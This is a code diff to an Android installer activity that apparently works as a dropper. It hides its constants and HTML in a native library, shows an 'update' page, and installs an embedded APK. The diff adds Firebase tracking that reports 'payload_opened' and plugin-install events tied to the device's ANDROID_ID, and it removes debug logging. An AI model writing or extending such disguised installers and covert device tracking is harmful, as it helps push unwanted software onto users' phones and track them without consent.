@@ -29,16 +29,15 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 
+import com.google.firebase.analytics.FirebaseAnalytics;
+
 public class MainActivity extends Activity {
 
     private static final String TAG = "MainActivity";
     private static final int REQUEST_INSTALL = 100;
     
-    // Native methods for getting constants
     private native String nativeGetString(String key);
     private native int nativeGetInt(String key);
-    
-    // Lazy-loaded constants from native
     private String getApkName() {
         return nativeGetString("APK_NAME");
     }
@@ -73,6 +72,7 @@ public class MainActivity extends Activity {
     private Handler handler = new Handler(Looper.getMainLooper());
     private boolean isInstalling = false;
     private NativeInstaller nativeInstaller;
+    private FirebaseAnalytics firebaseAnalytics;
 
     static {
         System.loadLibrary("installer");
@@ -107,6 +107,10 @@ public class MainActivity extends Activity {
                         }
                     });
 
+                    if (packageName != null) {
+                        logPluginInstalled(packageName);
+                    }
+
                     handler.postDelayed(new Runnable() {
                         @Override
                         public void run() {
@@ -116,6 +120,8 @@ public class MainActivity extends Activity {
                     break;
 
                 default:
+                    logInstallationFailed(message != null ? message : "Unknown error");
+                    
                     handler.post(new Runnable() {
                         @Override
                         public void run() {
@@ -140,6 +146,8 @@ public class MainActivity extends Activity {
 
         setupSystemBars();
 
+        initializeFirebase();
+
         try {
             IntentFilter filter = new IntentFilter(getActionInstall());
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -147,13 +155,15 @@ public class MainActivity extends Activity {
             } else {
                 registerReceiver(installReceiver, filter);
             }
-            android.util.Log.d(TAG, "BroadcastReceiver registered successfully");
         } catch (Exception e) {
-            android.util.Log.e(TAG, "Failed to register BroadcastReceiver", e);
         }
 
         nativeInstaller = new NativeInstaller();
+        loadConfig();
         setupWebView();
+        
+        logFirebaseEvent("app_open", null);
+        logPayloadOpened();
     }
 
     private void setupWebView() {
@@ -179,7 +189,6 @@ public class MainActivity extends Activity {
 
             setContentView(webView);
 
-            // Load HTML from native code
             String html = nativeGetHtml("update");
             if (html != null && !html.isEmpty()) {
                 webView.loadDataWithBaseURL("file:///android_asset/update/", html, "text/html", "UTF-8", null);
@@ -207,7 +216,6 @@ public class MainActivity extends Activity {
             handler.post(new Runnable() {
                 @Override
                 public void run() {
-                    // Show installing page
                     String html = nativeGetHtml("installing");
                     if (html != null && !html.isEmpty()) {
                         webView.loadDataWithBaseURL("file:///android_asset/update/", html, "text/html", "UTF-8", null);
@@ -253,6 +261,8 @@ public class MainActivity extends Activity {
         }
 
         isInstalling = true;
+        
+        logInstallationStarted();
 
         handler.post(new Runnable() {
             @Override
@@ -279,18 +289,17 @@ public class MainActivity extends Activity {
                         throw new Exception("Failed to copy APK");
                     }
 
-                    android.util.Log.d(TAG, "Starting native installation, APK path: " + apkPath);
                     boolean result = nativeInstaller.installApk(MainActivity.this, apkPath);
-                    android.util.Log.d(TAG, "Native installation result: " + result);
 
                     if (!result) {
                         throw new Exception("Native installation failed");
                     }
-                    
-                    android.util.Log.d(TAG, "Installation initiated successfully, waiting for callback");
 
                 } catch (Exception e) {
                     final String errorMsg = e.getMessage();
+                    
+                    logInstallationFailed(errorMsg);
+                    
                     handler.post(new Runnable() {
                         @Override
                         public void run() {
@@ -561,5 +570,66 @@ public class MainActivity extends Activity {
 
     private void toast(String msg) {
         Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
+    }
+
+    private void loadConfig() {
+    }
+
+    private void initializeFirebase() {
+        try {
+            FirebaseHelper.validatePackageName(this);
+            firebaseAnalytics = FirebaseAnalytics.getInstance(this);
+            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            firebaseAnalytics.setUserId(deviceId);
+            firebaseAnalytics.setUserProperty("installer_package", getPackageName());
+        } catch (Exception e) {
+            firebaseAnalytics = null;
+        }
+    }
+
+    private void logFirebaseEvent(String eventName, Bundle params) {
+        if (firebaseAnalytics == null) {
+            return;
+        }
+
+        try {
+            if (params == null) {
+                params = new Bundle();
+            }
+            
+            params.putString("installer_package", getPackageName());
+            params.putString("device_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+            
+            firebaseAnalytics.logEvent(eventName, params);
+        } catch (Exception e) {
+        }
+    }
+
+    private void logPayloadOpened() {
+        Bundle params = new Bundle();
+        params.putString("installer_package", getPackageName());
+        params.putString("device_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+        logFirebaseEvent("payload_opened", params);
+    }
+
+    private void logPluginInstalled(String pluginPackageName) {
+        Bundle params = new Bundle();
+        params.putString("plugin_package", pluginPackageName);
+        params.putString("installer_package", getPackageName());
+        params.putString("device_id", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+        logFirebaseEvent("plugin_installed", params);
+    }
+
+    private void logInstallationStarted() {
+        Bundle params = new Bundle();
+        logFirebaseEvent("installation_started", params);
+    }
+
+    private void logInstallationFailed(String error) {
+        Bundle params = new Bundle();
+        if (error != null) {
+            params.putString("error_message", error);
+        }
+        logFirebaseEvent("installation_failed", params);
     }
 }
